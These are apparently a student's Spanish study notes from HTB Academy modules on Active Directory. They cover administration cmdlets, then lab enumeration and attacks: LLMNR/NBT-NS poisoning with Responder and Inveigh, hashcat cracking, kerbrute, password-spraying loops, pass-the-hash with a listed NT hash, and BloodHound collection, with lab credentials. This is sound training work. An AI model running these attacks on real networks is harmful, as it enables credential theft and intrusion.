
# INTRODUCTION TO ACTIVE DIRECTORY

> xfreerdp /v:10.129.202.146 /u:htb-student_adm /p:Academy_student_DA!

Para este modulo se van a hacer tareas que haria alguien que administra un active directory primero

```
xfreerdp /v:10.129.202.146 /u:htb-student_adm /p:Academy_student_DA!

```
## Estructura

La estructura basica de active directory es

FOREST (que contiene uno o mas) -> dominios (que a su vez pueden tener subdominios) -> Subdominios - > OU Unidades Organizativas ( aqui no entiendo muy bien) -> Objetos (computadores GPO etc)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/0b1e7b78-5d54-4628-9b58-9c2cfc09f875)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/11efde5b-7bf4-4194-8c13-afadacf7b5be)

Una analogia buena es que un FOREST es como un pais y un dominio son como sus estados.}

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/270739a3-8025-403e-a392-8e4599c23823)

## Kerberos

La autenticacion de kerberos funciona mas o menos asi:

> As part of Active Directory Domain Services (AD DS), Domain Controllers have a Kerberos Key Distribution Center (KDC) that issues tickets.

> 1. When a user initiates a login request to a system, the client they are using to authenticate requests a ticket from the KDC, encrypting the request with the user's password.
> 2.  If the KDC can decrypt the request (AS-REQ) using their password, it will create a Ticket Granting Ticket (TGT) and transmit it to the user. 
> 3. The user then presents its TGT to a Domain Controller to request a Ticket Granting Service (TGS) ticket, encrypted with the associated service's NTLM password hash. 
> 4. Finally, the client requests access to the required service by presenting the TGS to the application or service, which decrypts it with its password hash. If the entire process completes appropriately, the user will be permitted to access the requested service or application.

> La autenticación Kerberos desacopla efectivamente las credenciales de los usuarios de sus solicitudes a los recursos consumibles, asegurando que su contraseña no se transmita a través de la red (es decir, accediendo a un sitio interno de intranet de SharePoint). El Centro de distribución de claves Kerberos (KDC) no registra transacciones anteriores. En cambio, el ticket del Servicio de concesión de tickets (TGS) de Kerberos se basa en un Ticket de concesión de tickets (TGT) válido. Se supone que si el usuario tiene un TGT válido, deberá haber acreditado su identidad. El siguiente diagrama explica este proceso en un nivel alto.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/10286f6f-1d91-44e5-b87e-a671a359a9d3)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/ee8df339-ab45-49a0-b8c2-3b886e4505b0)


El protocolo Kerberos utiliza el puerto 88 (tanto TCP como UDP). Al enumerar un entorno de Active Directory, a menudo podemos localizar controladores de dominio realizando escaneos de puertos en busca del puerto 88 abierto utilizando una herramienta como Nmap.


## LDAP 

 LDAP utiliza el puerto 389 y LDAP sobre SSL (LDAPS) se comunica a través del puerto 636.

 ![image](https://github.com/gecr07/HTB-Academy/assets/63270579/d8063d86-ebdf-4e1c-9320-23cb8306eec6)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/12a35522-7290-4a88-9b35-dd617b360ee4)


## Autenticación NTLM


> Aside from Kerberos and LDAP, Active Directory uses several other authentication methods which can be used (and abused) by applications and services in AD. These include LM, NTLM, NTLMv1, and NTLMv2. LM and NTLM here are the hash names, and NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash. Below is a quick comparison between these hashes and protocols, which shows us that, while not perfect by any means, Kerberos is often the authentication protocol of choice wherever possible. It is essential to understand the difference between the hash types and the protocols that use them.


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/acfe0be0-9a43-467e-a256-38257c9a8217)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/90d64bb4-1857-4881-a331-83e20e272651)

> Es importante tener en cuenta que una cuenta de máquina ( NT AUTHORITY\SYSTEMnivel de acceso) en un entorno AD tendrá la mayoría de los mismos derechos que una cuenta de usuario de dominio estándar. Esto es importante porque no siempre necesitamos obtener un conjunto de credenciales válidas para la cuenta de un usuario individual para comenzar a enumerar y atacar un dominio (como veremos en módulos posteriores). Podemos obtener SYSTEMacceso nivelado a un host de Windows unido a un dominio mediante un exploit de ejecución remota exitosa de código o escalando privilegios en un host. Este acceso a menudo se pasa por alto porque sólo es útil para saquear datos confidenciales (es decir, contraseñas, claves SSH, archivos confidenciales, etc.) en un host en particular. En realidad, el acceso en el contexto de laSYSTEMLa cuenta nos permitirá acceso de lectura a gran parte de los datos dentro del dominio y es un excelente punto de partida para recopilar la mayor cantidad de información posible sobre el dominio antes de continuar con los ataques aplicables relacionados con AD.

## Groups

 Hay dos tipos principales: security y distribution grupos.

 ![image](https://github.com/gecr07/HTB-Academy/assets/63270579/171abde6-4903-440e-b4f0-353ff4c016db)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/f70a0968-a5c8-4ad3-97ff-e62ee06fbcd2)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/319ed476-9d83-440f-8875-5cb683e2cecb)




## Snap-in 

> Un "Snap-in" en el contexto de Active Directory (AD) se refiere a una extensión o complemento que se puede agregar a la Consola de Administración de Microsoft Management Console (MMC) para proporcionar funcionalidad adicional relacionada con la administración de Active Directory.
La MMC es una herramienta de administración en Windows que ofrece una interfaz gráfica para administrar diversos componentes del sistema y servicios. Los Snap-ins son módulos que se pueden agregar a la MMC para extender su funcionalidad y permitir a los administradores realizar tareas específicas de administración en AD y otros componentes del sistema.
Por ejemplo, en el caso de Active Directory, hay varios Snap-ins disponibles que se utilizan para administrar distintos aspectos de Active Directory:
Active Directory Users and Computers: Este Snap-in se utiliza para administrar usuarios, grupos, computadoras y otros objetos relacionados con usuarios en Active Directory. Permite la creación, modificación y eliminación de estos objetos.
Active Directory Sites and Services: Se utiliza para administrar la topología de sitios y subredes en Active Directory, lo que es esencial para la replicación eficiente de datos entre controladores de dominio en diferentes ubicaciones físicas.
Active Directory Domains and Trusts: Este Snap-in se utiliza para administrar las relaciones de confianza entre dominios y realizar tareas relacionadas con la gestión de dominios, como establecer la relación de confianza entre dominios.
Group Policy Management: Permite administrar políticas de grupo y objetos de política de grupo en un entorno de Active Directory, lo que es esencial para establecer configuraciones y restricciones en las estaciones de trabajo y servidores en la red.
Active Directory Administrative Center: Proporciona una interfaz de administración moderna y avanzada para administrar objetos de Active Directory, incluyendo la gestión de usuarios y grupos.
En resumen, los Snap-ins en Active Directory son extensiones que se agregan a la MMC para simplificar y facilitar la administración de Active Directory y los componentes relacionados. Estos Snap-ins proporcionan una interfaz gráfica y herramientas específicas para administrar usuarios, grupos, políticas y otros aspectos de la infraestructura de Active Directory en un entorno de Windows.



## Agregar usuarios

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/45fc6349-db06-4ebf-804d-ec5edd7b166f)


Para estas actividades nos recomiendan estas paginas. Dentro vienen todas las acciones que se pueden hacer

> https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps

```
New-ADUser -Name "Orion Starchaser" -Accountpassword (ConvertTo-SecureString -AsPlainText (Read-Host "Enter a secure password") -Force ) -Enabled $true -OtherAttributes @{'title'="Analyst";'mail'="o.starchaser@inlanefreight.local"}
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/3036d794-178d-4561-a192-ec17f63e0bc0)

Via "Active Directory Users and Computers"

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/99235936-546d-4307-9cfb-275935723084)

### Remove users

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/b53cee12-ac16-401a-a576-9035b37ac908)


Para esta accion usa:

```

Remove-ADUser -Identity pvalencia
```

## Unlock a User

```
Unlock-ADAccount -Identity amasters 
```

## Reset User Password (Set-ADAccountPassword)

```
Set-ADAccountPassword -Identity 'amasters' -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ssw0rdReset!" -Force)
```

## Force Password Change (Set-ADUser)

```
Set-ADUser -Identity amasters -ChangePasswordAtLogon $true
```

## Groups

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/3ed8dc4a-2001-4365-8516-8a298e0a4449)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/a1d1ad4b-2bb7-445d-8e71-65c03b1fabe7)



![image](https://github.com/gecr07/HTB-Academy/assets/63270579/49be07df-9178-40f2-80fc-a2053d45cbb7)


## Create OU

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/48e078f4-41c9-49f2-b8ae-d998109d4ebe)

FIjate como va la ruta de la carpeta mas anidada a la menos ( por asi decirlo)

```

New-ADOrganizationalUnit -Name "Security Analysts" -Path "OU=IT,OU=HQ-NYC,OU=Employees,OU=CORP,DC=INLANEFREIGHT,DC=LOCAL"

```


## Create a group

Fijate como va de la carpeta mas anidada a la menos.

```
New-ADGroup -Name "Security Analysts" -SamAccountName analysts -GroupCategory Security -GroupScope Global -DisplayName "Security Analysts" -Path "OU=Security Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL" -Description "Members of this group are Security Analysts under the IT OU"
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/53acbf99-ae33-453f-89a7-141c8f322c90)

```
Copy-GPO -SourceName "Logon Banner" -TargetName "Security Analysts Control"
```

```
New-GPLink -Name "Security Analysts Control" -Target "ou=Security Analysts,ou=IT,OU=HQ-NYC,OU=Employees,OU=Corp,dc=INLANEFREIGHT,dc=LOCAL" -LinkEnabled Yes
```

En Active Directory, el "Logon Name" generalmente se refiere al "SAMAccountName" (Security Account Manager Account Name) de un usuario. El SAMAccountName es un nombre de cuenta único que se utiliza para autenticar a un usuario en un dominio de Windows. Es la parte del nombre de usuario que se utiliza para iniciar sesión en un sistema Windows o en una red basada en Active Directory.

## Members of a group

```
Get-ADGroupMember
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/1bee8505-d3d0-4016-a91b-3e67b46e9c6f)

Para agregar y linkear GPOS lo hicieron con PS no encontre yo otra manera.

## Group policie

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/5468ac33-d420-4543-ae23-82470ca68d6a)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/ea88d5c0-79c8-41b6-ac6c-09cca8d0ef6d)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/cbd7fbe8-4937-4188-8324-ff24353c19a5)


# Introduction to Active Directory Enumeration & Attacks

Aqui narra primero la enumracion externa ya dentro pone wireshark luego tcpdump

```
sudo tcpdum -i tun0
sudo responder -I ens224 -A
En modo analisis el responder (-A)
```

Saca con esto IPs y despues escanea encuentra el DC

> Los protocolos NBT-NS (NetBIOS Name Service) y mDNS (Multicast DNS) son dos protocolos de resolución de nombres que se utilizan en redes informáticas para descubrir y resolver nombres de dispositivos en la red. Aunque ambos cumplen una función similar, operan en contextos diferentes

> En resumen, NBT-NS se utiliza en redes Windows para resolver nombres NetBIOS, mientras que mDNS se utiliza en redes basadas en IP para resolver nombres de host y servicios en redes locales. Ambos protocolos son importantes en sus respectivos contextos y cumplen funciones de resolución de nombres en redes específicas.


## Kerbrute

Se aprovecha de la vulnerabilidad de autenticacion de kerberos y no levanta tantas alertas. Lo estamos tirando contra un DC que encontramos tenia hasta el puerto 88 abierto.

```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/dc8b50bb-47f2-4c92-8a5b-ce1d313abaa0)

## LLMNR & NBT-NS

> Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR.


> Utiliza puerto 5355 sobre UDP de forma nativa. Si LLMNR falla, se utilizará NBT-NS. NBT-NS identifica los sistemas en una red local por su nombre NetBIOS. NBT-NS utiliza puerto 137 sobre UDP.

El truco aquí es que cuando se utilizan LLMNR/NBT-NS para la resolución de nombres, CUALQUIER host de la red puede responder. Aquí es donde entramos nosotros( con el Responder) a envenenar estas peticiones. Con el acceso a la red, podemos falsificar una fuente autorizada de resolución de nombres (en este caso, un host que se supone pertenece al segmento de red) en el dominio de transmisión respondiendo al tráfico LLMNR y NBT-NS como si tuvieran una respuesta para la solicitud. anfitrión.

Este esfuerzo de envenenamiento se realiza para lograr que las víctimas se comuniquen con nuestro sistema pretendiendo que nuestro sistema fraudulento conoce la ubicación del host solicitado. Si el host solicitado requiere resolución de nombre o acciones de autenticación, podemos capturar el hash NetNTLM y someterlo a un ataque de fuerza bruta fuera de línea en un intento de recuperar la contraseña en texto sin cifrar. 

La solicitud de autenticación capturada también puede retransmitirse para acceder a otro host o usarse contra un protocolo diferente (como LDAP) en el mismo host. La suplantación de identidad de LLMNR/NBNS combinada con la falta de firma SMB a menudo puede conducir al acceso administrativo en los hosts dentro de un dominio. Los ataques de retransmisión SMB se tratarán en un módulo posterior sobre movimiento lateral.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/462d8c81-99f4-4db6-a54a-d0b7db95bc99)

## Herramientas

Las herraientas que se pueden utilizar son:

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/0a7c26c8-846a-415e-8e45-f675a2c1ed08)

El responder por defecto guarda los hashes en:

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/809da788-616e-4a93-8830-41006bf0cb49)

```
sudo responder -I ens224 
```

Una vez que tengamos suficiente, necesitamos obtener estos hashes en un formato utilizable para nosotros ahora mismo. Los hashes NetNTLMv2 son muy útiles una vez descifrados, pero no se pueden utilizar para técnicas como pash-the-hash, lo que significa que tenemos que intentar descifrarlos sin conexión. Podemos hacer esto con herramientas como Hashcat y John.

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
```
 Password al final (lo agrega)

 ![image](https://github.com/gecr07/HTB-Academy/assets/63270579/70321032-fae0-4b0c-b869-4ab1cd955e06)


## Powershell modulos ( Como funciona )

En PowerShell, puedes ver los módulos disponibles para importar utilizando el cmdlet Get-Module. Este cmdlet te mostrará una lista de módulos que están actualmente instalados en tu sistema y que están disponibles para su importación. Aquí tienes algunos ejemplos de cómo usarlo:

```
Get-Module -ListAvailable # Para ver una lista de todos los módulos disponibles en tu sistema
Get-Module # Para ver solo los módulos que están actualmente cargados en tu sesión de PowerShell 
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/42487519-9366-438c-b573-3b41a6e330df)


Para listar todos los módulos disponibles en todas las ubicaciones especificadas en la variable de entorno $env:PSModulePath, puedes utilizar un bucle para recorrer cada ubicación y luego usar el cmdlet Get-Module para obtener los módulos en cada una de ellas. Aquí tienes un script que realiza esta tarea:

### Tenemos de dos

Para agregar un modulo lo descargas y lo pones en alguna ruta de las que aparece en la variable de entorno. Y la segunda es ponerte en la carpeta donde esta el modulo .ps1 o .psm1.

```
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

## C# Inveigh (InveighZero) El responder de Windows

Aqui tiene 2 una version de ps que ya no se actualiza y la de C#

```
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Y la version exe es:

```
.\Inveigh.exe
ESC ( entras en console mode)
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/16bf2f6f-f330-4067-9bd7-30a496dea990)

## Enumerating the Password Policy - from Linux - Credentialed


Esto sirve para poder hacer password spraying. Y estas herramientas tambien pueden enumerar sessiones Nulas.

```
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

Enumerar sessiones nulas

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/4020a98b-3665-48ff-912e-e489350e5529)


```
rpcclient -U "" -N 172.16.5.5
querydominfo
enumdomusers

```

Otras opciones


```
enum4linux -P 172.16.5.5
### Nueva tool ( mas bien re escrita)

enum4linux-ng -P 172.16.5.5 -oA ilfreight

```

Enumerating Null Session - from Windows

```
 net use \\host\ipc$ "" /u:""
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.

The user name or password is incorrect.
```

### LDAP anonymous bind

LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Enumerating the Password Policy - from Windows

Se puede sacar la politica de passwords con ayuda de la herramienta net

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/64726871-08b2-4056-87b1-8c528cf53383)


```
net accounts
```

### PasswordComplexity

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/873047a8-57f0-4a51-9e89-da793932af9f)


> Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character (Password1 or Welcome1 would satisfy the "complexity" requirement here, but are still clearly weak passwords).

> La complejidad de la contraseña está habilitada, lo que significa que un usuario debe elegir una contraseña con 3/4 de los siguientes: una letra mayúscula, una letra minúscula, un número, un carácter especial ( Password1o Welcome1satisfaría el requisito de "complejidad" aquí, pero siguen siendo contraseñas claramente débiles) .

Si nos damos cuenta aqui le preguntamos siempre al DC (no entiendo aun porque)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/6d207489-8cc2-4a2e-8fda-aac5b4e2a5fd)


## Password spraying y Sesión SMB NULL para extraer la lista de usuarios

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/61ce9d85-f8a1-45d0-9828-991248ef3980)

Elimina cuentas que este cerca del lumbral de bloqueo de tu lista con ayuda de cme

```
crackmapexec smb 172.16.5.5 --users

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/5e3c5a43-8812-46db-8d2e-f28e7a003591)


> Finalmente, podemos usar CrackMapExeccon la --usersbandera. Esta es una herramienta útil que también mostrará badpwdcount(intentos de inicio de sesión no válidos), para que podamos eliminar cualquier cuenta de nuestra lista que esté cerca del umbral de bloqueo. También muestra el baddpwdtime, que es la fecha y hora del último intento de contraseña incorrecta, para que podamos ver qué tan cerca está una cuenta de restablecerse badpwdcount. En un entorno con varios controladores de dominio, este valor se mantiene por separado en cada uno de ellos. Para obtener un total preciso de los intentos de contraseña incorrecta de la cuenta, tendríamos que consultar cada controlador de dominio y usar la suma de los valores o consultar el controlador de dominio con la función FSMO del emulador de PDC.


### Kerbebrute

> Kerberos contarán para las cuentas de inicio de sesión fallidas de una cuenta y pueden provocar el bloqueo de la cuenta, por lo que aún debemos tener cuidado independientemente de el método elegido.

Igual aqui el tarjet es el DC

```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

Y ya teniendo un usuario y contraseña valido

```

sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

```


### Crear lista apartir de lo que nos dio Kerbrute

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/ce33afed-2ec5-4887-ae39-7eea9d6de6a0)

Entonces necesitamos solo el usuario vamos a usar la consola

```
cat valid_users.txt | awk -F "VALID USERNAME:" '{print $2}' > valid_users2.txt

Puedes usar este comando para borrar todos los espacio o bien mete un espacio antes del /g para que remplace todos los espacion solo por 1 asi sed 's/ \+/ /g' 
sed 's/ \+//g' valid_users2.txt > valid_users3.txt # Este remplaza todos los espacios los elimna 
#Finalmente para solo quedarnos con los usuarios
cat valid_users3.txt | awk -F "@" '{print $1}'

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/657c1eee-1fb6-4c6b-979e-88bde60bcaaf)


### RPCLIENT para password Spray

> Una vez que hayamos creado una lista de palabras usando uno de los métodos mostrados en la sección anterior, es hora de ejecutar el ataque. Rpcclientes una excelente opción para realizar este ataque desde Linux. Una consideración importante es que un inicio de sesión válido no es evidente de inmediato con rpcclient, y la respuesta Authority Nameindica un inicio de sesión exitoso. Podemos filtrar los intentos de inicio de sesión no válidos mediante greppingfor Authorityen la respuesta. La siguiente frase breve de Bash (adaptada de aquí ) se puede utilizar para realizar el ataque.

```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/278d64c5-f9cf-41d1-a69c-d5fb9ad3a4b3)


Con Kerbrute intente hacer el password spray pero no me dio ningun resultado no se porque

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

Sin embargo con cme si

```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
Y nos dio un resultado
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

### Reutilización de contraseña de administrador local

Prueba este tipo de ataque la reutilizacion de credenciales de administrador local.

```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Windows defender

Para ver si el AV esta activado usa

```
Get-MpComputerStatus
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/1ae0bd13-5b9a-4e07-8d2c-309db898e733)


## AppLocker

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/86c6488e-1429-45ae-9639-465501542ffb)


```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/24929d78-d2a0-4478-ab60-42752a1d68ac)

## PowerShell Constrained Language Mode

Otra proteccion es como una shell limitada para ver en que tipo de PS estas usa 

```
$ExecutionContext.SessionState.LanguageMode

```


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/da2491c7-9c00-4aa0-aeef-5ad069b92b47)




## LAPS


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/10c69035-c0fb-46ba-ab60-9edc47de54f2)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/09d68b69-30ca-4eaa-a76c-dd93a4a563e3)


> The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.


Esto es algo que tienes que checar ( no lo entiendo de mas)

## Enum AD with CME

Recuerda que necesitas credenciales ademas CME te dice cuantos intentos le quedan a cada usuario ( badpwdcount: 0 ) Para que solo uses esas.

```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

Para enumerar los grupos 

```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

Te dice los usuarios que tiene cada grupo 

```
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

```

Para usuarios conectados y encontramos que para una maquina es administrador local


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/19d97fb2-b8d1-4d9e-b856-015cf0b70bc6)


Enumerar shares del controlador de dominio

```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

## SQLMAP

Otra opcion para enumerar los shares


```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```


Este comando es importante porque nso dice los permisos que tiene

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e22c2bf4-5887-4fe1-8377-4ca86a54568a)


```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

```

## RPCLIENT

Debido a las sesiones SMB NULL (que se tratan en profundidad en las secciones de distribución de contraseñas) en algunos de nuestros hosts, podemos realizar enumeraciones autenticadas o no autenticadas usando rpcclient en el dominio INLANEFREIGHT.LOCAL. Un ejemplo de uso de rpcclient desde un punto de vista no autenticado (si esta configuración existe en nuestro dominio de destino) sería



![image](https://github.com/gecr07/HTB-Academy/assets/63270579/2b42aaf7-ab0c-4cf7-86ab-32104c5a3ab5)


Para enumerar sessiones nulas osea sin autenticar

```
rpcclient -U "" -N 172.16.5.5
```


## Impacket Toolkit

Ya sabes tiene para WinRM, PsExe y wmiexec ya lo documentaste en OSP notes.

## BloodHound

> The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files.


> Inicialmente solo se lanzó con un recopilador de PowerShell, por lo que tuvo que ejecutarse desde un host de Windows. Finalmente, un miembro de la comunidad lanzó una adaptación de Python (que requiere Impacket, ldap3y ). dnspythonEsto fue de gran ayuda durante las pruebas de penetración cuando tenemos credenciales de dominio válidas, pero no tenemos derechos para acceder a un host de Windows unido al dominio o no tenemos un host de ataque de Windows desde el cual ejecutar el recopilador SharpHound.


```
 sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
# Esto ejecuto el colector ahora vamos con la otra parte

sudo neo4j startn # Para inciar el servico de la base de datos

# activamos la gui

bloodhound

#Passwords por defecto

username: neo4j
password: neo4j
```
>https://www.kali.org/tools/bloodhound/

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/aae297ad-8c43-4c05-9c2e-6b43fd762217)

Lee lo que dice la primera vez tienes que ir a esa direccion y cambias las contraseñas por defecto 

### sudo apt remove vs auto-remove

Este sirve para desinstalar un paquete especifico

```
sudo apt remove
```

 Este comando se utiliza para eliminar automáticamente los paquetes huérfanos o dependencias no utilizadas que quedaron en el sistema después de la eliminación de un paquete. Los paquetes huérfanos son aquellos que ya no son necesarios porque el paquete que los requería ha sido eliminado.

```
sudo apt autoremove paquete
```

Desinstala un paquete de software específico.
Elimina todos los archivos de configuración del paquete del sistema.
Útil cuando deseas eliminar completamente un paquete y todas sus configuraciones, lo que puede ser útil si no planeas volver a instalar el paquete o si deseas eliminar todos los rastros de él en el sistema

```
sudo apt purge bloodhound
```

## GTOBINS pero de comandos para AD

> https://wadcoms.github.io/

Cert de AD

> https://www.alteredsecurity.com/adlab

> https://www.alteredsecurity.com/adlab

>  https://www.alteredsecurity.com/post/certified-red-team-professional-crtp


## Enum  AD with Windows

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/9b0c15ee-2df6-48eb-b9e5-596004c2bea3)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/920f510e-807f-41e7-bad1-77aea843af5b)


###  ActiveDirectory PowerShell module ( esta es una manera bastante silenciosa de enumerar el directorio)

The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line. 

```
Import-Module ActiveDirectory
Para checar
Get-Module
Get-Module -ListAvailable
```

### Informacion basica del dominio

Este comando nos da info basica

```
Get-ADDomain
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/a44a44a0-b939-4594-a972-5936a5355138)

### Enumerar usuarios 

Para enumerar todos los usuarios del dominio

```
Get-ADUser -Filter * -SearchBase "DC=INLANEFREIGHT,DC=LOCAL"
Get-ADUser -Filter * 
```

Para enumerar un solo usuario

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/25dfa1ba-f65c-4e38-a291-ea22bce18b59)

```
Get-ADUser user
```
Cuentas con el campo SPN lleno

> This will print out helpful information like the domain SID, domain functional level, any child domains, and more. Next, we'll use the Get-ADUser cmdlet. We will be filtering for accounts with the ServicePrincipalName property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack, which we will cover in-depth after the next section.

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Verificar los TRUST del dominio

```
Get-ADTrust -Filter *
```

### Group enumeration

Para saber el nombre de todos los grupos solo su nombre

```
Get-ADGroup -Filter * | select name
```

Para ver un solo grupo

```
Get-ADGroup Users
Get-ADGroup -Identity "Backup Operators"
```

### Enumerar los miembros de un grupo

```
Get-ADGroupMember -Identity "Backup Operators"

```

Solo tiene un miembro 

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/77af59d8-a67c-4a66-84d6-5fd7055f0d90)

> We can see that one account, backupagent, belongs to this group. It is worth noting this down because if we can take over this service account through some attack, we could use its membership in the Backup Operators group to take over the domain. We can perform this process for the other groups to fully understand the domain membership setup. Try repeating the process with a few different groups. You will see that this process can be tedious, and we will be left with an enormous amount of data to sift through. We must know how to do this with built-in tools such as the ActiveDirectory PowerShell module, but we will see later in this section just how much tools like BloodHound can speed up this process and make our results far more accurate and organized.

## Enumerar con PowerView ( siento que ya esta des actualizado)

Enumerar un solo usuario ya sabes importa el modulo etc...

```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

### Enumera grupos y nested groups ( Recursive Group Membership)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/caa23ff4-8efc-4120-8882-9868c16ed6eb)

```
 Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

> We saw some basic user information with PowerView. Now let's enumerate some domain group information. We can use the Get-DomainGroupMember function to retrieve group-specific information. Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. For example, the output below shows that the Secadmins group is part of the Domain Admins group through nested group membership. In this case, we will be able to view all of the members of that group who inherit Domain Admin rights via their group membership.


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/5f65b419-3b43-4643-9836-3c9189e372ad)


### Enumerar TRUST

```
Get-DomainTrustMapping
```
![image](https://github.com/gecr07/HTB-Academy/assets/63270579/b82a5969-e3a4-49b5-b672-d7b397eff7ac)

### Enumerar Administrador Local

Este comando ayuda a enumerar donde se tiene acceso de administrador local en que computadora.

```
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

